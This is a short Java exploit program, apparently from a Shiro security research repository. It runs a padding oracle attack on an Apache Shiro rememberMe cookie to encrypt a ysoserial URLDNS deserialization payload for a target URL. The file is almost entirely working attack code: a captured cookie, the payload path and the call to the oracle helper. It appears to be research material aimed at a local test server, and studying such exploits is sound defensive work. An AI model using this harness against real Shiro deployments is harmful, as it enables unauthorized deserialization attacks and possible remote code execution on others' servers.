package com.anbai.shiro.attack;

import com.anbai.shiro.attack.utils.Poracle;

import static com.anbai.shiro.attack.utils.Poracle.getFileContent;

/**
 * From longofo
 *
 * @author su18
 */
public class Attack721 {

	public static void main(String[] args) throws Exception {
		String  targetUrl        = "http://127.0.0.1:8080/shiro/index";
		String  rememberMeCookie = "F5Dktxan5VMiWyF/0y4zKae7M+N2grj9KgJzIbesLAA1b32Y/HQcwLisC3/P0lMuGn31mYyoxEusBchkUZGTk+NoCHuWFsuSieocSObHzVi1yk3YFKjw729Z0ot/ChtwlBZw10bVMNdPoB8KD24LBTVoYFNS0Q6Q7HK+T3kFtfj3mQVMlAtYEFhFNwILch+F03px8rZAZw6Zqq2eG6804hc4qPPkfePXyO3pmRAPaIbrZzMDolDLcfvXwajKS2RqlrQEJLkpYGIrsBPikJZceoN23VPrF1udHI8ws2nqlfYZ4NPVeq+hQWTC39VQoKrqn+bEU2bhtsYEm1fefc16tfbiPgPL2e8p17n4k3Mh24TzZ6Oh9wpdNXhvDXtWyIDgpIJVNzFKkowg3MO5Bb9OzO/L54kPaRlZoV2EUrVAloH+pht7I9gyGcZ39FE3Fvq7/IFMggnTo+2PyiH0ga19TZRAAFHq10xU/9p+2ZPBUpPk/8fpTdfSBbw3eslWBlMM";
		int     blockSize        = 16;
		String  payloadFilePath  = "/Users/phoebe/IdeaProjects/ysoserial-su18/URLDNS.bin";
		Poracle poracle          = new Poracle(getFileContent(payloadFilePath), blockSize, targetUrl, rememberMeCookie);

		System.out.printf("Result => %s%n", poracle.encrypt(null));
	}

}
